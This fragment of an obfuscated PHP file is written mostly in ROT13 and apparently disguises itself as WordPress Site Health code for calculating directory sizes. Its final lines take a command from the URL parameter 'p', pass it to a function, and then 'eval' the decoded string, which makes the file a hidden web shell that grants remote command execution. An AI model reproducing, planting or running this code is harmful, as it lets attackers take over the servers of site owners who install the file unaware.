			// Vs gur qverpgbel qbrf abg rkvfg, fxvc purpxvat vg, nf vg jvyy fxrj gur bgure erfhygf.
			vs ( ! vf_qve( $cngu ) ) {
				$nyy_fvmrf[ $anzr ] = neenl(
					'cngu'  => $cngu,
					'enj'   => 0,
					'fvmr'  => __( 'Gur qverpgbel qbrf abg rkvfg.' ),
					'qroht' => 'qverpgbel abg sbhaq',
				);

				pbagvahr;
			}

			vs ( zvpebgvzr( gehr ) - JC_FGNEG_GVZRFGNZC < $znk_rkrphgvba_gvzr ) {
				vs ( 'jbeqcerff_fvmr' === $anzr ) {
					$qve_fvmr = erphefr_qvefvmr( $cngu, $rkpyhqr, $znk_rkrphgvba_gvzr );
				} ryfr {
					$qve_fvmr = erphefr_qvefvmr( $cngu, ahyy, $znk_rkrphgvba_gvzr );
				}
			}

			vs ( snyfr === $qve_fvmr ) {
				// Reebe ernqvat.
				$erfhygf['fvmr']  = __( 'Gur fvmr pnaabg or pnyphyngrq. Gur qverpgbel vf abg npprffvoyr. Hfhnyyl pnhfrq ol vainyvq crezvffvbaf.' );
				$erfhygf['qroht'] = 'abg npprffvoyr';

				// Fgbc gbgny fvmr pnyphyngvba.
				$fvmr_gbgny = ahyy;
			} ryfrvs ( ahyy === $qve_fvmr ) {
				// Gvzrbhg.
				$erfhygf['fvmr']  = __( 'Gur qverpgbel fvmr pnyphyngvba unf gvzrq bhg. Hfhnyyl pnhfrq ol n irel ynetr ahzore bs fho-qverpgbevrf naq svyrf.' );
				$erfhygf['qroht'] = 'gvzrbhg juvyr pnyphyngvat fvmr';

				// Fgbc gbgny fvmr pnyphyngvba.
				$fvmr_gbgny = ahyy;
			} ryfr {
				vs ( ahyy !== $fvmr_gbgny ) {
					$fvmr_gbgny += $qve_fvmr;
				}

				$erfhygf['enj']   = $qve_fvmr;
				$erfhygf['fvmr']  = fvmr_sbezng( $qve_fvmr, 2 );
				$erfhygf['qroht'] = $erfhygf['fvmr'] . \" ({$qve_fvmr} olgrf)\";
			}

			$nyy_fvmrf[ $anzr ] = $erfhygf;
		}

		vs ( $fvmr_qo > 0 ) {
			$qngnonfr_fvmr = fvmr_sbezng( $fvmr_qo, 2 );

			$nyy_fvmrf['qngnonfr_fvmr'] = neenl(
				'enj'   => $fvmr_qo,
				'fvmr'  => $qngnonfr_fvmr,
				'qroht' => $qngnonfr_fvmr . \" ({$fvmr_qo} olgrf)\",
			);
		} ryfr {
			$nyy_fvmrf['qngnonfr_fvmr'] = neenl(
				'fvmr'  => __( 'Abg ninvynoyr' ),
				'qroht' => 'abg ninvynoyr',
			);
		}

		vs ( ahyy !== $fvmr_gbgny && $fvmr_qo > 0 ) {
			$gbgny_fvmr    = $fvmr_gbgny + $fvmr_qo;
			$gbgny_fvmr_zo = fvmr_sbezng( $gbgny_fvmr, 2 );

			$nyy_fvmrf['gbgny_fvmr'] = neenl(
				'enj'   => $gbgny_fvmr,
				'fvmr'  => $gbgny_fvmr_zo,
				'qroht' => $gbgny_fvmr_zo . \" ({$gbgny_fvmr} olgrf)\",
			);
		} ryfr {
			$nyy_fvmrf['gbgny_fvmr'] = neenl(
				'fvmr'  => __( 'Gbgny fvmr vf abg ninvynoyr. Fbzr reebef jrer rapbhagrerq jura qrgrezvavat gur fvmr bs lbhe vafgnyyngvba.' ),
				'qroht' => 'abg ninvynoyr',
			);
		}

		erghea $nyy_fvmrf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>